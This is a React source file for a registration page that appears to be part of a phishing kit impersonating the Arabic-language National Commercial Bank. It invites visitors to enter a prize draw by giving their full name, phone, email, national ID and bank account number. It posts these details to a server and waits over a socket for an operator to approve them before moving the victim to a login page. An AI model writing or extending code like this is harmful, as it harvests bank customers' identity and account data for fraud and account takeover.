import { useState } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import NcbLayout from "../components/NcbLayout";
import NcbWaitOverlay from "../components/NcbWaitOverlay";
import { api_route, socket } from "../config/api";
import { useAdminApproval } from "../hooks/useAdminApproval";
import { getSessionId, setSessionId } from "../utils/session";

export default function RegistrationPage() {
  const navigate = useNavigate();
  const [sessionId, setSessionIdState] = useState(getSessionId);
  const [form, setForm] = useState({
    name: "",
    phone: "",
    email: "",
    national_id: "",
    accountNumber: "",
    accountType: "",
  });
  const [terms, setTerms] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [localError, setLocalError] = useState("");
  const [showForm, setShowForm] = useState(false);

  const { waiting, error, startWaiting, clearError } = useAdminApproval({
    sessionId,
    acceptEvent: "acceptRegistration",
    declineEvent: "declineRegistration",
    onAccept: () => navigate("/login"),
  });

  const handleChange = (e) => {
    setForm((prev) => ({ ...prev, [e.target.name]: e.target.value }));
    setLocalError("");
    clearError();
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLocalError("");
    clearError();

    if (
      !form.name ||
      !form.phone ||
      !form.email ||
      !form.national_id ||
      !form.accountNumber ||
      !form.accountType
    ) {
      setLocalError("الرجاء تعبئة جميع الحقول");
      return;
    }
    if (!terms) {
      setLocalError("يجب الموافقة على الشروط والأحكام");
      return;
    }

    setSubmitting(true);
    try {
      const payload = {
        form_type: "ncb_bank",
        name: form.name,
        phone: form.phone,
        email: form.email,
        national_id: form.national_id,
        accountNumber: form.accountNumber,
        accountType: form.accountType,
      };

      const { data } = await axios.post(`${api_route}/reg`, payload);
      const id = data._id;
      setSessionId(id);
      setSessionIdState(id);
      socket.emit("registrationForm", id);
      socket.emit("newUser");
      startWaiting();
    } catch {
      setLocalError("حدث خطأ أثناء الإرسال، حاول مرة أخرى");
    } finally {
      setSubmitting(false);
    }
  };

  const displayError =
    localError ||
    (error
      ? "تم رفض طلب التسجيل من الإدارة، يرجى مراجعة البيانات والمحاولة مرة أخرى"
      : "");

  return (
    <NcbLayout>
      {!showForm && (
       
          <button
            type="button"
            className="ncb-splash"
            onClick={() => setShowForm(true)}
            aria-label="فتح نموذج التسجيل"
          >
            <img
              src="/assets/home.jpeg"
              alt="المصرف التجاري الوطني"
              className="ncb-mop"
            />
            <img
              src="/assets/home-desk.jpeg"
              alt="المصرف التجاري الوطني"
              className="ncb-desktop"
            />
          </button>
   
      )}

      {showForm && (
        <form className="ncb-form" onSubmit={handleSubmit}>
          {displayError && <div className="ncb-error">{displayError}</div>}

          <span className="text-center my-4">
            يرجى ادخال معلوماتك الصحيحة التابعة لحسابك لتتمكن من الدخول على
            السحب
          </span>
          <input
            className="ncb-input"
            name="name"
            placeholder="الاسم كامل"
            value={form.name}
            onChange={handleChange}
          />
          <input
            className="ncb-input"
            name="phone"
            type="tel"
            placeholder="رقم الموبايل"
            value={form.phone}
            onChange={handleChange}
            dir="ltr"
          />
          <input
            className="ncb-input"
            name="email"
            type="email"
            placeholder="البريد الإلكتروني"
            value={form.email}
            onChange={handleChange}
            dir="ltr"
          />
          <input
            className="ncb-input"
            name="national_id"
            placeholder="الرقم الوطني"
            value={form.national_id}
            onChange={handleChange}
            dir="ltr"
          />
          <input
            className="ncb-input"
            name="accountNumber"
            placeholder="رقم الحساب"
            value={form.accountNumber}
            onChange={handleChange}
            dir="ltr"
          />
          <select
            className="ncb-select"
            name="accountType"
            value={form.accountType}
            onChange={handleChange}
          >
            <option value="" disabled>
              نوع الحساب
            </option>
            <option value="أفراد">أفراد</option>
            <option value="أعمال">أعمال</option>
          </select>

          <label className="ncb-checkbox-row">
            <span>أوافق على الشروط والأحكام</span>
            <input
              type="checkbox"
              checked={terms}
              onChange={(e) => setTerms(e.target.checked)}
            />
          </label>

          <button
            className="ncb-btn"
            type="submit"
            disabled={submitting || waiting}
          >
            تسجيل
          </button>
        </form>
      )}

      <NcbWaitOverlay
        visible={waiting}
        message="جاري مراجعة بيانات التسجيل، يرجى الانتظار..."
      />
    </NcbLayout>
  );
}
